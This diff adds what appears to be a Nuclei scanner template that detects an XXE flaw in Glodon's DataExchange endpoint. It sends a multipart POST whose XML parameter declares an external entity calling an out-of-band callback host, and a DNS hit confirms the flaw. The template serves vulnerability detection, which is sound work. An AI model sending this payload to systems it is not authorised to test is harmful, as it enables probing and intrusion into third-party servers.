@@ -1,0 +1,42 @@
+id: glodon-dataexchang-xxe
+info:
+  name: Glodon DataExchange XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog, xxe
+
+variables:
+  boundary: '{{rand_base(34)}}'
+
+http:
+  - raw:
+      - |
+        POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="SystemName"
+
+        BIM
+        ------{{boundary}}
+        Content-Disposition: form-data; name="Params"
+        Content-Type: text/plain
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE test [
+        <!ENTITY t SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <test>&t;</test>
+        ------{{boundary}}--
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
